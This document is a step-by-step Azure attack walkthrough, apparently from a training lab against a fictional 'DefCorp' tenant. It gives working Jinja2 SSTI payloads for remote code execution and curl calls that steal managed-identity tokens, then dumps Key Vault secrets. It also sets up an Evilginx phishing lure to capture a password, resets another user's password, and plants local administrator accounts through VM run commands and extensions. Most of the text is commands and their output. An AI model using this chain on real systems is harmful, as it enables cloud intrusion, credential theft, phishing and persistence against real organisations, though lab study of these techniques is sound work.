- `https://vaultfrontend.azurewebsites.net/` has an interesting feature that allows us to get new purchase link. We can test this for possible vulnerabilities, discovering that it is vulnerable to SSTI.
```
{{7*7}}
```

- This results in the following output -> `Purchase link has been sent to 49`.

- We need to figure the exact language and template framework (either PHP or Python).
```python
{{config.items()}}
```

```
Ã—Purchase link has been sent to dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;5791628bb0b13ce0c676dfde280ba245&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(days=31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093), (&#39;SQLALCHEMY_DATABASE_URI&#39;, &#39;sqlite:///site.db&#39;), (&#39;SQLALCHEMY_BINDS&#39;, None), (&#39;SQLALCHEMY_NATIVE_UNICODE&#39;, None), (&#39;SQLALCHEMY_ECHO&#39;, False), (&#39;SQLALCHEMY_RECORD_QUERIES&#39;, None), (&#39;SQLALCHEMY_POOL_SIZE&#39;, None), (&#39;SQLALCHEMY_POOL_TIMEOUT&#39;, None), (&#39;SQLALCHEMY_POOL_RECYCLE&#39;, None), (&#39;SQLALCHEMY_MAX_OVERFLOW&#39;, None), (&#39;SQLALCHEMY_COMMIT_ON_TEARDOWN&#39;, False), (&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;, None), (&#39;SQLALCHEMY_ENGINE_OPTIONS&#39;, {})])
```

- The output above indicates that Flask in in use. We can leverage the SSTI vulnerability to gain RCE on the target.
```python
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

```
Purchase link has been sent to root
```

- We can leverage this RCE to steal tokens from the Managed Identity. We will steal tokens for both ARM and MSGraph.
```python
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

```python
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

- We can use the stolen tokens to authenticate to Azure as the Managed Identity.
```powershell
PS C:\Auditor> $armtoken = 'eyJ0eX...9oubDtbHa5g'
PS C:\Auditor> $msgraphtoken = 'eyJ0eXA...8kCZ4G56v5w'
PS C:\Auditor> Connect-AzAccount -AccountId '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc' -AccessToken $armtoken -MicrosoftGraphAccessToken $msgraphtoken

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc DefCorp          2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud

PS C:\Auditor> Rename-AzContext "DefCorp (b413826f-108d-4049-8c11-d52d5d388768) - 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 - 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc" "DefCorp (b413826f-108d-4049-8c11-d52d5d388768) - 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 - vaultfrontend"
```

- List all accessible Resources.
```powershell
PS C:\Auditor> Get-AzResource


Name              : ResearchKeyVault
ResourceGroupName : Research
ResourceType      : Microsoft.KeyVault/vaults
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault
Tags              :
```

- List Role assignments that the Managed Identity has on the accessible Resources.
```powershell
PS C:\Auditor> Get-AzRoleAssignment | Select-Object -Property Scope,RoleDefinitionName

Scope                                                                                                                            RoleDefinitionName
-----                                                                                                                            ------------------
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault Reader
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault Key Vault Secrets User
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault Reader
```

- We find an interesting Role assignment, `Key Vault Secrets User`. We can query more information about it.
```powershell
PS C:\Auditor> Get-AzRoleDefinition -Name 'Key Vault Secrets User'


Name             : Key Vault Secrets User
Id               : 4633458b-17de-408a-b874-0445c86b69e6
IsCustom         : False
Description      : Read secret contents. Only works for key vaults that use the 'Azure role-based access control' permission model.
Actions          : {}
NotActions       : {}
DataActions      : {Microsoft.KeyVault/vaults/secrets/getSecret/action, Microsoft.KeyVault/vaults/secrets/readMetadata/action}
NotDataActions   : {}
AssignableScopes : {/}
```

- Since we cannot see the permissions for the current token (`Get-AzRoleAssignment` only shows Role assignments to ObjectIDs and there is no way to get this attribute for the Managed Identity through this cmdlet), we need to use the Azure REST API calls to query the Roles that this Managed Identity has on this specific Resource. We can request a new ARM access token by exploiting the vulnerable web app.
```powershell
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.KeyVault/vaults/ResearchKeyVault/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

```powershell
actions  notActions
-------  ----------
{}       {}
{*/read} {}
```

- The output above indicates that we can list and read secrets from `ResearchKeyVault` . First we need to request a `KeyVault` access token through the SSTI exploitation and use that to reauthenticate to Azure. We will also request new tokens for ARM and MSGraph.
```python
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

```powershell
PS C:\Windows\system32> $keyvaulttoken = 'eyJ0e...oiI6F6aAeA1A'
PS C:\Windows\system32> $armtoken = 'eyJ0eX...d9oubDtbHa5g'
PS C:\Windows\system32> $msgraphtoken = 'eyJ0eXAi...kCZ4G56v5w'
PS C:\Windows\system32> Connect-AzAccount -AccessToken $armtoken -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken -MicrosoftGraphAccessToken $msgraphtoken

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc DefCorp          2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud


PS C:\Windows\system32> Rename-AzContext "DefCorp (b413826f-108d-4049-8c11-d52d5d388768) - 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 - 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc" "DefCorp (b413826f-108d-4049-8c11-d52d5d388768) - 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 - vaultfrontend"
```

- We can now start listing and requesting access to secrets stored in the Key Vault.
```powershell
PS C:\Windows\system32> Get-AzKeyVaultSecret -VaultName ResearchKeyVault


Vault Name   : researchkeyvault
Name         : Reader
Version      :
Id           : https://researchkeyvault.vault.azure.net:443/secrets/Reader
Enabled      : True
Expires      :
Not Before   :
Created      : 1/30/2024 7:01:20 AM
Updated      : 1/30/2024 7:01:20 AM
Content Type :
Tags         :

PS C:\Windows\system32> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
username: kathynschaefer@defcorphq.onmicrosoft.com ; password: IW!llFoUndInth3KeyVault@Azur3
```

- We have discovered plaintext credentials for `kathynschaefer@defcorphq.onmicrosoft.com`. We can use them to authenticate to Azure through both Azure Portal and PowerShell.
```powershell
PS C:\Windows\system32> $password = ConvertTo-SecureString 'IW!llFoUndInth3KeyVault@Azur3' -AsPlainText -Force
PS C:\Windows\system32> $creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
PS C:\Windows\system32> Connect-AzAccount -Credential $creds

Account                                  SubscriptionName TenantId                             Environment
-------                                  ---------------- --------                             -----------
kathynschaefer@defcorphq.onmicrosoft.com DefCorp          2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud
```

- We can now list all the accessible Resources for `kathynschaefer@defcorphq.onmicrosoft.com`.
```powershell
PS C:\Windows\system32> Get-AzResource


Name              : jumpvm
ResourceGroupName : RESEARCH
ResourceType      : Microsoft.Compute/virtualMachines
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
Tags              :

Name              : jumpvm/MicrosoftMonitoringAgent
ResourceGroupName : RESEARCH
ResourceType      : Microsoft.Compute/virtualMachines/extensions
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm/extensions/MicrosoftMonitoringAgent
Tags              :
```

- We can list Role assignments to `kathynschaefer@defcorphq.onmicrosoft.com` for the accessible Resources.
```powershell
PS C:\Windows\system32> Get-AzRoleAssignment | Select-Object -Property Scope,RoleDefinitionName

Scope                                                                                                                          RoleDefinitionName
-----                                                                                                                          ------------------
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm Reader
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm Virtual Machine Command Executor
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm Reader
```

- We find an interesting Role, `Virtual Machine Command Executor`. We can query more information about it.
```powershell
PS C:\Windows\system32> Get-AzRoleDefinition -Name 'Virtual Machine Command Executor'


Name             : Virtual Machine Command Executor
Id               : f824060c-c059-4ebc-991c-82fd4ee5ea61
IsCustom         : True
Description      : Ability to only run commands on the Virtual Machine.
Actions          : {Microsoft.Compute/virtualMachines/runCommand/action}
NotActions       : {}
DataActions      : {}
NotDataActions   : {}
AssignableScopes : {/subscriptions/b413826f-108d-4049-8c11-d52d5d388768}
```

- We can check the Role assignments for `jumpvm`.
```powershell
PS C:\Auditor> Get-AzRoleAssignment | Select-Object -Property Scope,RoleDefinitionName,DisplayName

Scope                                                                                                                          RoleDefinitionName               DisplayName
-----                                                                                                                          ------------------               -----------
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm Reader                           Kathy N. Schaefer
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm Virtual Machine Command Executor VM Admins
/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm Reader                           VM Admins
```

- We can see that members of the `VM Admins` Group can execute commands on `jumpvm`. We can find members of that Group.
```powershell
PS C:\Auditor> Get-AzADGroupMember -GroupDisplayName "VM Admins"
WARNING: This cmdlet is using API version beta which is under preview.

DisplayName        Id                                   OdataType
-----------        --                                   ---------
VM Contributor 72  50c30955-2b75-49bb-87bb-814c62a45053 #microsoft.graph.user

<snip>
```

- We can check whether `VMContributor72@defcorphq.onmicrosoft.com` is part of any AUs by querying MSGraph API.
```powershell
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
$URI = ' https://graph.microsoft.com/v1.0/users/VMContributor72@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value | select '@odata.type',displayname,descriptio
```

```powershell
@odata.type                         displayName  description
-----------                         -----------  -----------
#microsoft.graph.administrativeUnit Control Unit To Limit the privileges.
#microsoft.graph.group              VM Admins    Members of this groups can execute commands on the VM
```

- The output above indicates that `VMContributor72@defcorphq.onmicrosoft.com` is a member of the `Control Unit` Administrative Unit. AUs are used to group objects together so that actions can be performed _ON THEM_.
- We can now list Roles that are assigned to that AU and what other Identities have those Roles to perform the corresponding actions on members of the AU.
```powershell
$URI = 'https://graph.microsoft.com/v1.0/directory/administrativeUnits/e1e26d93-163e-42a2-a46e-1b7d52626395/scopedRoleMembers'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value | fl *
```

```powershell
id                   : 7TU5Wy21gECLBToYMhlNOpNt4uE-FqJCpG4bfVJiY5VZgwiM-2ZTQq0NqRuC_VSKU
roleId               : 5b3935ed-b52d-4080-8b05-3a1832194d3a
administrativeUnitId : e1e26d93-163e-42a2-a46e-1b7d52626395
roleMemberInfo       : @{id=8c088359-66fb-4253-ad0d-a91b82fd548a; displayName=Roy G. Cain; userPrincipalName=roygcain@defcorphq.onmicrosoft.com}
```

- We can see that `roygcain@defcorphq.onmicrosoft.com` has a Role assigned to. We can query for more information about that specific Role to get an idea of what actions that User Identity can perform on members of the target AU.
```powershell
$URI = 'https://graph.microsoft.com/v1.0/directoryRoles/5b3935ed-b52d-4080-8b05-3a1832194d3a'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams)
```

```powershell
@odata.context  : https://graph.microsoft.com/v1.0/$metadata#directoryRoles/$entity
id              : 5b3935ed-b52d-4080-8b05-3a1832194d3a
deletedDateTime :
description     : Allowed to view, set and reset authentication method information for any non-admin user.
displayName     : Authentication Administrator
roleTemplateId  : c4e39bd9-1100-46d3-8c65-fb160da0071f
```

- We can see that `roygcain@defcorphq.onmicrosoft.com` can reset the passwords for members of that AU. We must somehow target that User Identity to abuse the permissions that it has. We can attempt to execute a phishing attack using **Evilginx** against it.
```powershell
PS C:\Windows\system32> Copy-Item C:\Users\studentuser72\.evilginx\crt\ca.crt C:\Users\studentuser72\.evilginx\crt\login.student72.corp\o365.crt
PS C:\Windows\system32> Copy-Item C:\Users\studentuser72\.evilginx\crt\private.key C:\Users\studentuser72\.evilginx\crt\login.student72.corp\o365.key
PS C:\AzAD\Tools> evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets

<snip>

: config domain student72.corp
[23:34:34] [inf] server domain set to: student72.corp
[23:34:34] [war] server ip not set! type: config ip <ip_address>
: config ip 172.16.150.72
[23:34:40] [inf] server IP set to: 172.16.150.72
: phishlets hostname o365 login.student72.corp
[23:35:03] [inf] phishlet 'o365' hostname set to: login.student72.corp
[23:35:03] [inf] disabled phishlet 'o365'
: phishlets get-hosts o365

172.16.150.72 login.login.student72.corp
172.16.150.72 www.login.student72.corp

: phishlets enable o365
[23:42:19] [inf] enabled phishlet 'o365'
[23:42:19] [inf] setting up certificates for phishlet 'o365'...
[23:42:19] [+++] successfully set up SSL/TLS certificates for domains: [login.login.student72.corp www.login.student72.corp]
: lures create o365
[23:43:06] [inf] created lure with ID: 0
: lures get-url 0

https://login.login.student72.corp/zDcbNXDZ
```

- We can use the link above to phish `roygcain@defcorphq.onmicrosoft.com` using an external email.
```powershell
<snip>

[23:56:42] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
[23:56:42] [+++] [0] Password: [RoyIsAuth3ntica1onPers0n@InDefHQ]
[23:56:42] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
```

- We can now authenticate to Azure as `roygcain@defcorphq.onmicrosoft.com` and reset the password of `VMContributor72@defcorphq.onmicrosoft.com`.
```powershell
PS C:\Windows\system32> $password = ConvertTo-SecureString 'RoyIsAuth3ntica1onPers0n@InDefHQ' -AsPlainText -Force
PS C:\Windows\system32> $creds = New-Object System.Management.Automation.PSCredential('roygcain@defcorphq.onmicrosoft.com', $password)
PS C:\Windows\system32> Connect-AzAccount -Credential $creds

Account                            SubscriptionName TenantId                             Environment
-------                            ---------------- --------                             -----------
roygcain@defcorphq.onmicrosoft.com                  2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud
```

- `roygcain@defcorphq.onmicrosoft.com` has the `Authentication Administrator` Role scoped to the `Control Unit` AU, and `VMContributorx72@defcorphq.onmicrosoft.com` is a member of that AU. This means that we can reset the password for that User Identity.
```powershell
PS C:\Windows\system32> $password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText -Force
PS C:\Windows\system32> Update-AzADUser -UPN VMContributor72@defcorphq.onmicrosoft.com -Password $password
```

- We can now authenticate to Azure as `VMContributor72@defcorphq.onmicrosoft.com`.
```powershell
PS C:\Windows\system32> $password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText -Force
PS C:\Windows\system32> $creds = New-Object System.Management.Automation.PSCredential('VMContributor72@defcorphq.onmicrosoft.com', $password)
PS C:\Windows\system32> Connect-AzAccount -Credential $creds

Account                                   SubscriptionName TenantId                             Environment
-------                                   ---------------- --------                             -----------
VMContributor72@defcorphq.onmicrosoft.com DefCorp          2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud
```

- Since `VMContributor72@defcorphq.onmicrosoft.com` can run OS commands on `jumpvm` we have to find an interface and an IP address that we can use.
```powershell
PS C:\Windows\system32> Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | fl *


ResourceGroupName        : RESEARCH
Id                       : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Micros
                           oft.Compute/virtualMachines/jumpvm
VmId                     : a8a3d68c-3220-4cd3-9148-2166d037cde1
Name                     : jumpvm
Type                     : Microsoft.Compute/virtualMachines
Location                 : germanywestcentral
ExtendedLocation         :
LicenseType              : Windows_Client
Tags                     : {}
AvailabilitySetReference :
DiagnosticsProfile       : Microsoft.Azure.Management.Compute.Models.DiagnosticsProfile
Extensions               : {MicrosoftMonitoringAgent}
HardwareProfile          : Microsoft.Azure.Management.Compute.Models.HardwareProfile
InstanceView             :
NetworkProfile           : Microsoft.Azure.Management.Compute.Models.NetworkProfile
SecurityProfile          :
OSProfile                : Microsoft.Azure.Management.Compute.Models.OSProfile
BillingProfile           :
Plan                     :
ProvisioningState        : Succeeded
StorageProfile           : Microsoft.Azure.Management.Compute.Models.StorageProfile
DisplayHint              : Compact
Identity                 :
Zones                    :
FullyQualifiedDomainName :
AdditionalCapabilities   :
ProximityPlacementGroup  :
Host                     :
VirtualMachineScaleSet   :
EvictionPolicy           :
Priority                 :
HostGroup                :
CapacityReservation      :
UserData                 :
ApplicationProfile       :
PlatformFaultDomain      :
RequestId                : 18f71624-4385-43df-814a-c81377047975
StatusCode               : OK

PS C:\Windows\system32> Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | select -ExpandProperty NetworkProfile | fl *


NetworkInterfaces              : {/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers
                                 /Microsoft.Network/networkInterfaces/jumpvm741}
NetworkApiVersion              :
NetworkInterfaceConfigurations :

PS C:\Windows\system32> Get-AzNetworkInterface -Name jumpvm741


Name                        : jumpvm741
ResourceGroupName           : Research
Location                    : germanywestcentral
Id                          : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Mic
                              rosoft.Network/networkInterfaces/jumpvm741
Etag                        : W/"b0cd8a47-3cca-4d8d-b865-d84fbfba5d84"
ResourceGuid                : 2310de62-3457-410b-9ca1-93b059716939
ProvisioningState           : Succeeded
Tags                        :
VirtualMachine              : {
                                "Id": "/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/prov
                              iders/Microsoft.Compute/virtualMachines/jumpvm"
                              }
IpConfigurations            : [
                                {
                                  "Name": "ipconfig1",
                                  "Etag": "W/\"b0cd8a47-3cca-4d8d-b865-d84fbfba5d84\"",
                                  "Id": "/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/pr
                              oviders/Microsoft.Network/networkInterfaces/jumpvm741/ipConfigurations/ipconfig1",
                                  "PrivateIpAddress": "10.0.1.4",
                                  "PrivateIpAllocationMethod": "Dynamic",
                                  "Subnet": {
                                    "Id": "/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/
                              providers/Microsoft.Network/virtualNetworks/Research-vnet/subnets/default",
                                    "IpAllocations": []
                                  },
                                  "PublicIpAddress": {
                                    "IpTags": [],
                                    "Zones": [],
                                    "Id": "/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/
                              providers/Microsoft.Network/publicIPAddresses/jumpvm-ip"
                                  },
                                  "ProvisioningState": "Succeeded",
                                  "PrivateIpAddressVersion": "IPv4",
                                  "LoadBalancerBackendAddressPools": [],
                                  "LoadBalancerInboundNatRules": [],
                                  "Primary": true,
                                  "ApplicationGatewayBackendAddressPools": [],
                                  "ApplicationSecurityGroups": [],
                                  "VirtualNetworkTaps": []
                                }
                              ]
DnsSettings                 : {
                                "DnsServers": [],
                                "AppliedDnsServers": [],
                                "InternalDomainNameSuffix": "abvsnny0vqyufoe3cy0ocqz23h.frax.internal.cloudapp.net"
                              }
EnableIPForwarding          : False
EnableAcceleratedNetworking : False
VnetEncryptionSupported     : False
AuxiliaryMode               : None
NetworkSecurityGroup        : {
                                "Id": "/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Security/prov
                              iders/Microsoft.Network/networkSecurityGroups/NetworkSecurity"
                              }
TapConfigurations           : []
Primary                     : True
MacAddress                  : 00-22-48-0E-5B-6A
ExtendedLocation            : null



PS C:\Windows\system32> Get-AzPublicIpAddress -Name jumpvm-ip


Name                     : jumpvm-ip
ResourceGroupName        : Research
Location                 : germanywestcentral
Id                       : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Micros
                           oft.Network/publicIPAddresses/jumpvm-ip
Etag                     : W/"964da123-8951-4c87-b903-1a04b6b146ea"
ResourceGuid             : bd1942bd-1241-431a-bf97-860c422681bf
ProvisioningState        : Succeeded
Tags                     :
PublicIpAllocationMethod : Dynamic
IpAddress                : 51.116.180.87
PublicIpAddressVersion   : IPv4
IdleTimeoutInMinutes     : 4
IpConfiguration          : {
                             "Id": "/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/provide
                           rs/Microsoft.Network/networkInterfaces/jumpvm741/ipConfigurations/ipconfig1"
                           }
DnsSettings              : null
Zones                    : {}
Sku                      : {
                             "Name": "Basic",
                             "Tier": "Regional"
                           }
IpTags                   : []
ExtendedLocation         : null
```

- We can now run a script to add a user that we control at the local administrators group.
```powershell
PS C:\Windows\system32> Invoke-AzVMRunCommand -ScriptPath C:\AzAD\Tools\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName 'Research'


Value[0]        :
  Code          : ComponentStatus/StdOut/succeeded
  Level         : Info
  DisplayStatus : Provisioning succeeded
  Message       : Name      Enabled Description
----      ------- -----------
student72 True


Value[1]        :
  Code          : ComponentStatus/StdErr/succeeded
  Level         : Info
  DisplayStatus : Provisioning succeeded
  Message       :
Status          : Succeeded
Capacity        : 0
Count           : 0
```

- We can now use the account we have created to connect to `jumpvm`.
```powershell
PS C:\Windows\system32> $password = ConvertTo-SecureString 'Stud72Password@123' -AsPlainText -Force
PS C:\Windows\system32> $creds = New-Object System.Management.Automation.PSCredential('student72', $password)
PS C:\Windows\system32> $jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
PS C:\Windows\system32> Enter-PSSession -Session $jumpvm
[51.116.180.87]: PS C:\Users\student72\Documents> whoami;hostname
jumpvm\student72
jumpvm
```

- Let's now check whether we can find any interesting credentials.
```powershell
[51.116.180.87]: PS C:\Users\student72\Documents> $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[51.116.180.87]: PS C:\Users\student72\Documents> [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

$Password = ConvertTo-SecureString 'V!rtualM@chinesManag3dByTheUs3r' -AsPlainText -Force # Pass change
$Cred = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $Password)
Connect-AzAccount -Credential $Cred
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv
```

- We have discovered credentials for `samcgray@defcorphq.onmicrosoft.com`. We can use them to authenticate to Azure as that User Identity.
```powershell
PS C:\AzAD\Tools> $password = ConvertTo-SecureString 'V!rtualM@chinesManag3dByTheUs3r' -AsPlainText -Force
PS C:\AzAD\Tools> $creds = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $password)
PS C:\AzAD\Tools> Connect-AzAccount -Credential $creds

Account                            SubscriptionName TenantId                             Environment
-------                            ---------------- --------                             -----------
samcgray@defcorphq.onmicrosoft.com DefCorp          2d50cb29-5f7b-48a4-87ce-fe75a941adb6 AzureCloud
```

- We can list the Groups and AUs that this User Identity is a member of.
```powershell
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
$URI = ' https://graph.microsoft.com/v1.0/users/samcgray@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value | select '@odata.type',displayname
```

```powershell
@odata.type            displayName
-----------            -----------
#microsoft.graph.group Security Operations
```

- We can also list the accessible Resources to that User Identity.
```powershell
PS C:\Auditor> Get-AzResource


Name              : infradminsrv/ExecCmd
ResourceGroupName : Research
ResourceType      : Microsoft.Compute/virtualMachines/extensions
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/extensions/ExecCmd
Tags              :

Name              : infradminsrv/MicrosoftMonitoringAgent
ResourceGroupName : Research
ResourceType      : Microsoft.Compute/virtualMachines/extensions
Location          : germanywestcentral
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/extensions/MicrosoftMonitoringAgent
Tags              :
```

- We can now query for the allowed actions on the `adminsrv` VM that `samcgray@defcorphq.onmicrosoft.com` has using the Azure API.
```powershell
$Token = (Get-AzAccessToken).Token
$URI = ' https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

```powershell
actions    : {Microsoft.Compute/virtualMachines/extensions/write, Microsoft.Compute/virtualMachines/extensions/read}
notActions : {}
```

- `samcgray@defcorphq.onmicrosoft.com` has `Write` and `Read` permissions over `infradminsrv`.
- We can modify the `ExecCmd` extension to add a new user as a local administrator.
```powershell
PS C:\AzAD\Tools> Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student72 Stud72Password@123 /add /Y; net localgroup administrators student72 /add"}'

RequestId IsSuccessStatusCode StatusCode ReasonPhrase
--------- ------------------- ---------- ------------
                         True         OK
```

- We can use that to access `infradminsrv`, however we need to do it through `jumpvm` since `infradminsrv` is not directly accessible from our machine.
```powershell
PS C:\AzAD\Tools> $password = ConvertTo-SecureString 'Stud72Password@123' -AsPlainText -Force
PS C:\AzAD\Tools> $creds = New-Object System.Management.Automation.PSCredential('student72', $password)
PS C:\AzAD\Tools> $jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
PS C:\AzAD\Tools> Enter-PSSession -Session $jumpvm

[51.116.180.87]: PS C:\Users\student72\Documents> $password = ConvertTo-SecureString 'Stud72Password@123' -AsPlainText -Force
